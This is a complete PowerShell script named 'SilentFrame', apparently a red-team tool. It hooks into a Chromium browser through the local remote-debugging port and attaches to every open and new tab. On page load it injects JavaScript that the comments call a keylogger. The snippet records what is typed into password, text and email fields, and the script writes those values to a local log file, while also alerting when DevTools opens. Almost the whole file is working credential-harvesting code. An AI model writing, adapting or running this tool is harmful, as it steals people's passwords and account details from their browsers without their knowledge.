# Author: Dahvid Schloss a.k.a APT Big Daddy
# Email: dahvid@EmulatedCriminals.com
# Date: 01-29-2026
# Update: 01-29-2026
# Patch Notes: 
# Description: SilentFrame connects to Chromium's CDP WebSocket, auto‑attaches to page targets, and logs page lifecycle/console events to both the terminal and console.log. 
#             It can also inject a configurable JavaScript snippet (defaulting to a DOM field listener) when a page finishes loading.

param(
  [string]$DebuggerHost = "127.0.0.1",
  [int]$Port = 9222,
  [string]$Js = ""
)

$ErrorActionPreference = "Stop"
$LogPath = Join-Path $PSScriptRoot "console.log"

function Write-Log([string]$Line) {
  $stamp = Get-Date -Format "dd-MM-yy HH:mm"
  $out = "[$stamp] $Line"
  Add-Content -Path $LogPath -Value $out
  # keep stdout quieter so you can type
  Write-Host $out
}

# Browser websocket
$ver = Invoke-RestMethod -Uri "http://$DebuggerHost`:$Port/json/version" -Method Get
$browserWsUrl = $ver.webSocketDebuggerUrl
if (-not $browserWsUrl) { throw "No webSocketDebuggerUrl from /json/version; is remote debugging enabled?" }

# Connect once (single websocket for browser + all sessions)
$ws = [System.Net.WebSockets.ClientWebSocket]::new()
$ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(20)
$ws.ConnectAsync([Uri]$browserWsUrl, [Threading.CancellationToken]::None).GetAwaiter().GetResult() | Out-Null

# Shared state so main thread can quit
$state = [hashtable]::Synchronized(@{
  Quit = $false
  Id = 1
  Js = $Js
})

if (-not $state.Js -or $state.Js.Trim().Length -eq 0) {
  
# this is our keylogging function. It used the DOM API to load in an event listener for password inputs
  $state.Js = @'
(() => {
  // install-once guard (script-level)
  if (window.__silentFrameInstalled) return;
  window.__silentFrameInstalled = true;

  const state = new WeakMap();

  function observe(el) {
    if (state.has(el)) return; // element-level guard

    state.set(el, {
      timer: null,
      lastLoggedValue: null
    });

    //this just puts a fancy format in front of the logged keys so we know what field it is
  function describe(el) 
  {
      if (el.tagName === "TEXTAREA") return "textarea";
      if (el.tagName === "INPUT") return `[${el.type}]`;
      if (el.isContentEditable) return "contenteditable";
      return el.tagName.toLowerCase();
  }


  //listener events
  el.addEventListener('input', () => {
      const s = state.get(el);
      clearTimeout(s.timer);

      s.timer = setTimeout(() => 
      {
        const v = el.value;
       // Only log if it changed since last time we logged
        if (v !== s.lastLoggedValue) 
        {
          s.lastLoggedValue = v;
          const label = describe(el);
          console.log(label, v);
        } 
      }, 1500);
    });
  }
    //probably should add more input fields but text usually caputres usernames, passwords captures passwords, and email does something
document
  .querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea')
  .forEach(observe);
  })();

'@
}

Write-Log "[INFO] Browser WS: $browserWsUrl"
Write-Log "[INFO] Logging to: $LogPath"
Add-Content -Path $LogPath -Value ("[{0}] [INFO] logger started" -f (Get-Date -Format "dd-MM-yy HH:mm"))

# Background receiver runspace (keeps UI input free)
$receiver = [PowerShell]::Create()
$null = $receiver.AddScript({
  param($ws, $logPath, $state)

  function Log($s) {
    $line = ("[{0}] {1}" -f (Get-Date -Format "dd-MM-yy HH:mm"), $s)
    Add-Content -Path $logPath -Value $line
    [Console]::WriteLine($line)
    [Console]::Out.Flush()
  }

  function Short-Id([string]$sid) {
    if ([string]::IsNullOrEmpty($sid)) { return "" }
    if ($sid.Length -le 6) { return $sid }
    return $sid.Substring(0, 6)
  }

  function Is-WebUrl([string]$url) {
    return ($url -match '^https?://')
  }

  function Alert([string]$msg, [string]$color) {
    $line = ("[{0}] [ALERT] {1}" -f (Get-Date -Format "dd-MM-yy HH:mm"), $msg)
    Add-Content -Path $logPath -Value $line
    Write-Host $line -ForegroundColor $color
  }

  function Enable-Session([string]$sid) {
    if ($sessionEnabled[$sid]) { return }
    $sessionEnabled[$sid] = $true
    Send-ToSession $sid "Runtime.enable" $null
    Send-ToSession $sid "Page.enable" $null
    Send-ToSession $sid "Log.enable" $null
    Send-ToSession $sid "Page.setLifecycleEventsEnabled" @{ enabled = $true }
  }

  function Send($obj) {
    $json  = $obj | ConvertTo-Json -Compress -Depth 50
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $seg   = [System.ArraySegment[byte]]::new($bytes)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult() | Out-Null
  }

  # This wraps a session-scoped CDP call into Target.sendMessageToTarget so the browser knows which tab to hit
  # sessionId = the tab/session we are talking to
  # method/params = the CDP command we want to run inside that tab
  # tag = optional label so we can match the response and log it clean
  function Send-ToSession([string]$sessionId, [string]$method, [hashtable]$params, [string]$tag = "") {
    $id = [int]$state.Id
    $state.Id = $id + 1
    # Track tag by ID so we can label the response when it comes back
    if ($tag) { $evalIds[$id] = $tag }

    # Inner CDP command that runs inside the target session
    $inner = @{
      id     = $id
      method = $method
    }
    # Only attach params if provided (keeps payload clean)
    if ($params) { $inner.params = $params }

    # Outer envelope that tells the browser which session to send this to
    Send @{
      id     = $id
      method = "Target.sendMessageToTarget"
      params = @{
        sessionId = $sessionId
        # message must be a JSON string per CDP spec
        message   = ($inner | ConvertTo-Json -Compress -Depth 50)
      }
    }
  }

  # This is the raw websocket read loop
  # It pulls chunks until EndOfMessage then parses JSON
  # If the socket closes we return $null so the caller can quit clean
  function Recv() {
    $buffer = New-Object byte[] 65536
    $ms = New-Object System.IO.MemoryStream
    do {
      $seg = New-Object System.ArraySegment[byte] -ArgumentList (, $buffer)
      $res = $ws.ReceiveAsync($seg, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
      if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { return $null }
      $ms.Write($buffer, 0, $res.Count)
    } while (-not $res.EndOfMessage)

    $text = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
    try { return ($text | ConvertFrom-Json) } catch { return $null }
  }

  # Track session type for each sessionId (page, worker, etc.)
  $sessionType = @{}
  # Track when a JS execution context exists for a session
  $sessionCtxReady = @{}
  # Track when CDP domains are enabled for a session
  $sessionEnabled = @{}
  # Track eval request IDs so we can label their responses
  $evalIds = @{}
  # Track which targetIds we've attached to
  $attachedTargets = @{}
  # Track which targetIds we already alerted on (newtab/devtools)
  $alertedTargets = @{}
  # Map targetId -> sessionId
  $targetToSession = @{}

  # Enable discover + auto attach
  $id0 = [int]$state.Id; $state.Id = $id0 + 1
  Send @{ id = $id0; method = "Target.setDiscoverTargets"; params = @{ discover = $true } }

  $id1 = [int]$state.Id; $state.Id = $id1 + 1
  Send @{
    id     = $id1
    method = "Target.setAutoAttach"
    params = @{ autoAttach = $true; waitForDebuggerOnStart = $false; flatten = $false }
  }

  Log "[INFO] Auto-attach enabled"

  # Attach to existing page targets (auto-attach only catches new ones)
  $id2 = [int]$state.Id; $state.Id = $id2 + 1
  Send @{ id = $id2; method = "Target.getTargets" }

  while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open -and -not $state.Quit) {
    $msg = Recv
    if ($null -eq $msg) {
      Log "[INFO] websocket closed"
      $state.Quit = $true
      break
    }

    if ($msg.method -eq "Target.attachedToTarget") {
      $sid = $msg.params.sessionId
      $t = $msg.params.targetInfo
      $sessionType[$sid] = $t.type
      if ($t.targetId) {
        $attachedTargets[$t.targetId] = $true
        $targetToSession[$t.targetId] = $sid
      }

      $url = $t.url
      # Honestly pretty sure this is f'ed I'm not good with coloring text so could not be working as intended
      if ($t.targetId -and -not $alertedTargets.ContainsKey($t.targetId)) {
        if ($url -like "devtools://*") {
          Alert "DEVTOOLS opened" "Red"
          $alertedTargets[$t.targetId] = $true
        } elseif ($url -eq "edge://newtab/") {
          Alert "new tab" "Green"
          $alertedTargets[$t.targetId] = $true
        }
      }

      Log ("[ATTACH] type={0} sid={1} url={2}" -f $t.type, (Short-Id $sid), $url)

      if ($t.type -eq "page" -and (Is-WebUrl $url)) {
        Enable-Session $sid
      }
      # DON'T eval immediately. Wait for execution context / DOMContentLoaded / nav events below.
      continue
    }

    # Response to Target.getTargets (initial attach to existing tabs)
    if ($msg.id -eq $id2 -and $msg.result -and $msg.result.targetInfos) {
      foreach ($t in $msg.result.targetInfos) {
        if ($t.type -eq "page" -and $t.targetId) {
          $idA = [int]$state.Id; $state.Id = $idA + 1
          Send @{
            id     = $idA
            method = "Target.attachToTarget"
            params = @{ targetId = $t.targetId; flatten = $false }
          }
        }
      }
      continue
    }

    if ($msg.method -eq "Target.detachedFromTarget") {
      $sid = $msg.params.sessionId
      if ($msg.params.targetId) {
        $attachedTargets.Remove($msg.params.targetId) | Out-Null
        $targetToSession.Remove($msg.params.targetId) | Out-Null
      }
      Log ("[DETACH] sid={0}" -f (Short-Id $sid))
      $sessionType.Remove($sid) | Out-Null
      $sessionEnabled.Remove($sid) | Out-Null
      continue
    }

    if ($msg.method -eq "Target.targetCreated") {
      $t = $msg.params.targetInfo
      if ($t.targetId -and -not $alertedTargets.ContainsKey($t.targetId)) {
        if ($t.url -like "devtools://*") {
          Alert "DEVTOOLS opened" "Red"
          $alertedTargets[$t.targetId] = $true
        } elseif ($t.url -eq "edge://newtab/") {
          Alert "new tab" "Green"
          $alertedTargets[$t.targetId] = $true
        }
      }

      if ($t.type -eq "page" -and $t.targetId -and -not $attachedTargets.ContainsKey($t.targetId)) {
        $idA = [int]$state.Id; $state.Id = $idA + 1
        Send @{
          id     = $idA
          method = "Target.attachToTarget"
          params = @{ targetId = $t.targetId; flatten = $false }
        }
      }
      continue
    }

    if ($msg.method -eq "Target.targetInfoChanged") {
      $t = $msg.params.targetInfo
      if ($t.targetId -and $targetToSession.ContainsKey($t.targetId)) {
        $sid = $targetToSession[$t.targetId]
        if ($sessionType[$sid] -eq "page" -and (Is-WebUrl $t.url)) {
          Enable-Session $sid
        }
      }
      continue
    }

    if ($msg.method -eq "Target.receivedMessageFromTarget") {
      $sid = $msg.params.sessionId
      $payloadText = $msg.params.message
      try { $p = $payloadText | ConvertFrom-Json } catch { continue }

      # Only care about page sessions
      if ($sessionType[$sid] -ne "page") { continue }
      if (-not $sessionEnabled[$sid]) { continue }

      # Navigation (full)
      if ($p.method -eq "Page.frameNavigated" -and [string]::IsNullOrEmpty($p.params.frame.parentId)) {
        Log ("[NAV][{0}] {1}" -f (Short-Id $sid), $p.params.frame.url)
        continue
      }

      # Navigation (SPA)
      if ($p.method -eq "Page.navigatedWithinDocument") {
        Log ("[SPA][{0}] {1}" -f (Short-Id $sid), $p.params.url)
        continue
      }

      # DOM ready (good time to eval too)
      if ($p.method -eq "Page.lifecycleEvent" -and $p.params.name -eq "DOMContentLoaded") {
        Log ("[DOM][{0}] DOMContentLoaded" -f (Short-Id $sid))

        if ($state.Js -and $state.Js.Trim().Length -gt 0) {
          Send-ToSession $sid "Runtime.evaluate" @{ expression = $state.Js; awaitPromise = $true; returnByValue = $true } "DOM"
          Log ("[EVAL][{0}] triggered on DOMContentLoaded" -f (Short-Id $sid))
        }
        continue
      }

      # Execution context created (safe point to eval)
      if ($p.method -eq "Runtime.executionContextCreated") {
        $sessionCtxReady[$sid] = $true
        Log ("[CTX][{0}] created" -f (Short-Id $sid))
        continue
      }

      # Console logs
      if ($p.method -eq "Runtime.consoleAPICalled") {
        $type = $p.params.type
        $parts = @($p.params.args | ForEach-Object {
          if ($null -ne $_.value) { $_.value }
          elseif ($null -ne $_.description) { $_.description }
          else { "" }
        })
        Log ("[CONSOLE][{0}][{1}] {2}" -f (Short-Id $sid), $type, ($parts -join " "))
        continue
      }

      # Log domain entries (errors/warnings/info)
      if ($p.method -eq "Log.entryAdded") {
        $entry = $p.params.entry
        if ($entry.level -eq "verbose") { continue }
        $msg = $entry.text
        if ($entry.url) { $msg = "{0} ({1})" -f $msg, $entry.url }
        Log ("[LOG][{0}][{1}] {2}" -f (Short-Id $sid), $entry.level, $msg)
        continue
      }

      # Uncaught exceptions
      if ($p.method -eq "Runtime.exceptionThrown") {
        $details = $p.params.exceptionDetails
        $text = $details.text
        if ($details.exception -and $details.exception.description) {
          $text = $details.exception.description
        }
        Log ("[EXCEPTION][{0}] {1}" -f (Short-Id $sid), $text)
        continue
      }

      # Evaluate result / errors (so you can see if your JS actually ran)
      if ($p.id -and $evalIds.ContainsKey($p.id)) {
        $tag = $evalIds[$p.id]
        $evalIds.Remove($p.id) | Out-Null
        if ($p.error) {
          Log ("[EVAL-ERR][{0}][{1}] {2}" -f (Short-Id $sid), $tag, ($p.error | ConvertTo-Json -Compress))
        } elseif ($p.result -and $p.result.result) {
          if ($p.result.exceptionDetails) {
            Log ("[EVAL-EX][{0}][{1}] {2}" -f (Short-Id $sid), $tag, ($p.result.exceptionDetails | ConvertTo-Json -Compress))
          } else {
            $val = $p.result.result.value
            if ($null -eq $val -and $p.result.result.description) { $val = $p.result.result.description }
            Log ("[EVAL-OK][{0}][{1}] {2}" -f (Short-Id $sid), $tag, $val)
          }
        }
      }
    }
  }

  Log "[INFO] receiver exiting"
}).AddArgument($ws).AddArgument($LogPath).AddArgument($state)

$async = $receiver.BeginInvoke()

Write-Host "Receiver running. Type 'quit' then Enter to exit."

# Main thread input (non-blocking)
$lineBuffer = ""
while (-not $state.Quit) {
  if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
    $state.Quit = $true
    break
  }

  while ([Console]::KeyAvailable) {
    $key = [Console]::ReadKey($true)
    if ($key.Key -eq "Enter") {
      [Console]::WriteLine()
      $cmd = $lineBuffer
      $lineBuffer = ""
      if ($cmd -and $cmd.Trim().ToLowerInvariant() -in @("q","quit","exit")) {
        $state.Quit = $true
        break
      }
    } elseif ($key.Key -eq "Backspace") {
      if ($lineBuffer.Length -gt 0) {
        $lineBuffer = $lineBuffer.Substring(0, $lineBuffer.Length - 1)
        [Console]::Write("`b `b")
      }
    } else {
      $lineBuffer += $key.KeyChar
      [Console]::Write($key.KeyChar)
    }
  }

  Start-Sleep -Milliseconds 100
}

Write-Host "Stopping..."
try {
  if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
    $ws.CloseAsync(
      [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
      "quit",
      [Threading.CancellationToken]::None
    ).GetAwaiter().GetResult() | Out-Null
  }
} catch {}

try {
  if (-not $async.AsyncWaitHandle.WaitOne(2000)) {
    try { $receiver.Stop() } catch {}
  } else {
    $receiver.EndInvoke($async) | Out-Null
  }
} catch {}
$receiver.Dispose()
$ws.Dispose()

Write-Host "Done. Check console.log for events."


